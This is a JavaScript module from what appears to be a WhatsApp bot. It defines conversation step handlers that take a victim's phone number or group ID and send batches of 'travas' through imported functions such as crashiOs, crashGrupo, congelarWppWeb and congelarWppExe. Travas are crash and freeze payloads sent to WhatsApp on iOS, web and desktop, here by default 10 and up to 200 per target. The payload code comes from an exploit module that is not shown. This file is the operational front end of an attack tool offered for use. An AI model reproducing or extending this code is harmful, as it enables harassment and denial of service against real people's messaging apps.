// utils/stepHandlers.js
// Sistema de step handlers para entrada de dados (adaptado do Bruxo)
const logger = require("../logger");
const {
    crashiOs,
    enviarAtraso,
    crashGrupo,
    atrasoInvisible,
    convite,
    carrinho,
    sistema,
    sistema2,
    nullAtraso,
    atraso2,
    FotoGrupo,
    fotobutton,
    listLoc,
    congelarWppWeb,
    congelarWppExe
} = require("./bruxoExploits");

// Mapeamento de step handlers para funções
let figurinhaStepHandlers = null;
function getFigurinhaSteps() {
    if (!figurinhaStepHandlers) {
        try {
            figurinhaStepHandlers = require('../commands/figurinhaCanal').stepHandlers || {};
        } catch (_) {
            figurinhaStepHandlers = {};
        }
    }
    return figurinhaStepHandlers;
}

let joinStepHandlers = null;
function getJoinSteps() {
    if (!joinStepHandlers) {
        try {
            joinStepHandlers = require('../commands/joinRequests').stepHandlers || {};
        } catch (_) {
            joinStepHandlers = {};
        }
    }
    return joinStepHandlers;
}

let divulgacaoStepHandlers = null;
function getDivulgacaoSteps() {
    if (!divulgacaoStepHandlers) {
        try {
            divulgacaoStepHandlers = require('../commands/divulgar/config').stepHandlers || {};
        } catch (_) {
            divulgacaoStepHandlers = {};
        }
    }
    return divulgacaoStepHandlers;
}

let zoneStepHandlers = null;
function getZoneSteps() {
    if (!zoneStepHandlers) {
        try {
            zoneStepHandlers = require('../commands/zoneMedia').stepHandlers || {};
        } catch (_) {
            zoneStepHandlers = {};
        }
    }
    return zoneStepHandlers;
}

const stepHandlers = {
    'awaiting_crashios': handleCrashIOS,
    'awaiting_atraso': handleAtraso,
    'awaiting_crashgp': handleCrashGP,
    'awaiting_atrasogp': handleAtrasoGP,
    'awaiting_convite': handleConvite,
    'awaiting_carrinho': handleCarrinho,
    'awaiting_sistema': handleSistema,
    'awaiting_sistema2': handleSistema2,
    'awaiting_nullatraso': handleNullAtraso,
    'awaiting_atraso2': handleAtraso2,
    'awaiting_fotogp': handleFotoGP,
    'awaiting_fotobutton': handleFotoButton,
    'awaiting_listloc': handleListLoc,
    'awaiting_wppexe': handleWppExe,
    'awaiting_wppweb': handleWppWeb,
};

// Quantidade padrão por usuário (pode ser configurada via DB)
const defaultQuantidade = 10;

// Funções handler para cada step
async function handleCrashIOS(conn, ctx, text) {
    const targetJid = parseNumber(text);
    if (!targetJid) {
        await conn.sendMessage(ctx.from, { text: "Número inválido. Use formato internacional (+55 99 99999-9999)" }, { quoted: ctx.info });
        return false;
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas crashios...*` }, { quoted: ctx.info });
    await crashiOs(conn, targetJid, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleAtraso(conn, ctx, text) {
    const targetJid = parseNumber(text);
    if (!targetJid) {
        await conn.sendMessage(ctx.from, { text: "Número inválido. Use formato internacional (+55 99 99999-9999)" }, { quoted: ctx.info });
        return false;
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas atraso...*` }, { quoted: ctx.info });
    await enviarAtraso(conn, targetJid, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleCrashGP(conn, ctx, text) {
    const groupId = text.trim();
    if (!groupId) {
        await conn.sendMessage(ctx.from, { text: "ID do grupo inválido." }, { quoted: ctx.info });
        return false;
    }
    
    // Normaliza o JID do grupo
    let targetGroup = groupId;
    if (!groupId.includes('@')) {
        targetGroup = groupId.replace(/[^0-9]/g, '') + '@g.us';
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas crashgp...*` }, { quoted: ctx.info });
    await crashGrupo(conn, targetGroup, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleAtrasoGP(conn, ctx, text) {
    const groupId = text.trim();
    if (!groupId) {
        await conn.sendMessage(ctx.from, { text: "ID do grupo inválido." }, { quoted: ctx.info });
        return false;
    }
    
    // Normaliza o JID do grupo
    let targetGroup = groupId;
    if (!groupId.includes('@')) {
        targetGroup = groupId.replace(/[^0-9]/g, '') + '@g.us';
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas atrasogp...*` }, { quoted: ctx.info });
    await atrasoInvisible(conn, targetGroup, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleConvite(conn, ctx, text) {
    const targetJid = parseNumber(text);
    if (!targetJid) {
        await conn.sendMessage(ctx.from, { text: "Número inválido. Use formato internacional (+55 99 99999-9999)" }, { quoted: ctx.info });
        return false;
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas convite...*` }, { quoted: ctx.info });
    await convite(conn, targetJid, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleCarrinho(conn, ctx, text) {
    const targetJid = parseNumber(text);
    if (!targetJid) {
        await conn.sendMessage(ctx.from, { text: "Número inválido. Use formato internacional (+55 99 99999-9999)" }, { quoted: ctx.info });
        return false;
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas carrinho...*` }, { quoted: ctx.info });
    await carrinho(conn, targetJid, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleSistema(conn, ctx, text) {
    const targetJid = parseNumber(text);
    if (!targetJid) {
        await conn.sendMessage(ctx.from, { text: "Número inválido. Use formato internacional (+55 99 99999-9999)" }, { quoted: ctx.info });
        return false;
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas sistema...*` }, { quoted: ctx.info });
    await sistema(conn, targetJid, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleSistema2(conn, ctx, text) {
    const targetJid = parseNumber(text);
    if (!targetJid) {
        await conn.sendMessage(ctx.from, { text: "Número inválido. Use formato internacional (+55 99 99999-9999)" }, { quoted: ctx.info });
        return false;
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas sistema2...*` }, { quoted: ctx.info });
    await sistema2(conn, targetJid, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleNullAtraso(conn, ctx, text) {
    const targetJid = parseNumber(text);
    if (!targetJid) {
        await conn.sendMessage(ctx.from, { text: "Número inválido. Use formato internacional (+55 99 99999-9999)" }, { quoted: ctx.info });
        return false;
    }
    
    const quantidade = ctx.session.quantidade || 200;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas nullatraso...*` }, { quoted: ctx.info });
    await nullAtraso(conn, targetJid, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleAtraso2(conn, ctx, text) {
    const targetJid = parseNumber(text);
    if (!targetJid) {
        await conn.sendMessage(ctx.from, { text: "Número inválido. Use formato internacional (+55 99 99999-9999)" }, { quoted: ctx.info });
        return false;
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas atraso2...*` }, { quoted: ctx.info });
    await atraso2(conn, targetJid, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleFotoGP(conn, ctx, text) {
    const groupId = text.trim();
    if (!groupId) {
        await conn.sendMessage(ctx.from, { text: "ID do grupo inválido." }, { quoted: ctx.info });
        return false;
    }
    
    // Normaliza o JID do grupo
    let targetGroup = groupId;
    if (!groupId.includes('@')) {
        targetGroup = groupId.replace(/[^0-9]/g, '') + '@g.us';
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas fotogp...*` }, { quoted: ctx.info });
    await FotoGrupo(conn, targetGroup, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleFotoButton(conn, ctx, text) {
    const targetJid = parseNumber(text);
    if (!targetJid) {
        await conn.sendMessage(ctx.from, { text: "Número inválido. Use formato internacional (+55 99 99999-9999)" }, { quoted: ctx.info });
        return false;
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    
    // Obter foto de perfil
    let ppUrl = "https://images5.alphacoders.com/134/1347690.png";
    try {
        ppUrl = await conn.profilePictureUrl(targetJid, 'image');
    } catch (e) {}
    
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas fotobutton...*` }, { quoted: ctx.info });
    await fotobutton(conn, targetJid, ppUrl, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleListLoc(conn, ctx, text) {
    const targetJid = parseNumber(text);
    if (!targetJid) {
        await conn.sendMessage(ctx.from, { text: "Número inválido. Use formato internacional (+55 99 99999-9999)" }, { quoted: ctx.info });
        return false;
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas listloc...*` }, { quoted: ctx.info });
    await listLoc(conn, targetJid, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleWppExe(conn, ctx, text) {
    const targetJid = parseNumber(text);
    if (!targetJid) {
        await conn.sendMessage(ctx.from, { text: "Número inválido. Use formato internacional (+55 99 99999-9999)" }, { quoted: ctx.info });
        return false;
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas wppexe...*` }, { quoted: ctx.info });
    await congelarWppExe(conn, targetJid, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

async function handleWppWeb(conn, ctx, text) {
    const targetJid = parseNumber(text);
    if (!targetJid) {
        await conn.sendMessage(ctx.from, { text: "Número inválido. Use formato internacional (+55 99 99999-9999)" }, { quoted: ctx.info });
        return false;
    }
    
    const quantidade = ctx.session.quantidade || defaultQuantidade;
    await conn.sendMessage(ctx.from, { text: `*Enviando ${quantidade} travas wppweb...*` }, { quoted: ctx.info });
    await congelarWppWeb(conn, targetJid, quantidade);
    await conn.sendMessage(ctx.from, { text: "*Concluído.*" }, { quoted: ctx.info });
    return true;
}

// Função auxiliar para parsear número (aceita +55 51 8205-2118 etc.)
function parseNumber(text) {
    if (!text) return null;
    try {
        const { parsePhoneAndQty } = require('./phoneTarget');
        const parsed = parsePhoneAndQty(String(text).trim(), { defaultQty: 1 });
        return parsed?.jid || null;
    } catch (_) {
        if (String(text).includes('@')) return String(text).trim();
        const cleanNumber = String(text).replace(/\D/g, '');
        if (cleanNumber.length < 10) return null;
        return `${cleanNumber}@s.whatsapp.net`;
    }
}

// Função principal para processar step
async function processStep(conn, ctx, text) {
    const step = ctx.session?.step;
    const fig = getFigurinhaSteps();
    const join = getJoinSteps();
    const div = getDivulgacaoSteps();
    const zone = getZoneSteps();
    const handler =
        (step && stepHandlers[step]) ||
        (step && fig[step]) ||
        (step && join[step]) ||
        (step && div[step]) ||
        (step && zone[step]) ||
        null;

    if (!step || !handler) {
        return false;
    }
    
    try {
        const prevStep = step;
        const success = await handler(conn, ctx, text);
        
        if (success) {
            if (ctx.session && ctx.session.step === prevStep) {
                ctx.session.step = null;
                ctx.session.quantidade = null;
            }
        }

        // Step ativo: consome a mensagem mesmo em validacao (nao vira comando)
        if (ctx.session?.step) return true;
        return !!success;
    } catch (error) {
        const msg = String(error?.message || error);
        const soft =
            /Connection Closed|Timed Out|Socket.*closed|ECONNRESET|not connected|closed/i.test(msg);
        try {
            const { isProcessShuttingDown } = require('../connection');
            if (isProcessShuttingDown() || soft) {
                logger.logAviso(`[processStep] abort suave: ${msg}`);
                return false;
            }
        } catch (_) {
            if (soft) {
                logger.logAviso(`[processStep] abort suave: ${msg}`);
                return false;
            }
        }
        logger.logErro("processStep", msg);
        try {
            await conn.sendMessage(ctx.from, { text: "Erro ao processar comando. Tente novamente." }, { quoted: ctx.info });
        } catch (_) { /* socket morto */ }
        if (ctx.session) {
            ctx.session.step = null;
            ctx.session.quantidade = null;
        }
        return false;
    }
}

// Função para iniciar um step
function setStep(ctx, stepName, quantidade = null) {
    if (!ctx.session || typeof ctx.session !== 'object') {
        try {
            const { getConversationSession } = require('./conversationSession');
            ctx.session = getConversationSession(ctx.sessionId, ctx.sender);
        } catch (_) {
            ctx.session = { step: null, quantidade: null };
        }
    }
    ctx.session.step = stepName;
    if (quantidade) {
        ctx.session.quantidade = quantidade;
    }
    try {
        require('./conversationSession').touchConversationSession(ctx.session);
    } catch (_) { /* ignore */ }
}

// Função para cancelar step
function cancelStep(ctx) {
    if (!ctx.session || typeof ctx.session !== 'object') {
        try {
            const { getConversationSession } = require('./conversationSession');
            ctx.session = getConversationSession(ctx.sessionId, ctx.sender);
        } catch (_) {
            ctx.session = { step: null, quantidade: null };
        }
    }
    ctx.session.step = null;
    ctx.session.quantidade = null;
}

module.exports = {
    processStep,
    setStep,
    cancelStep,
    stepHandlers
};
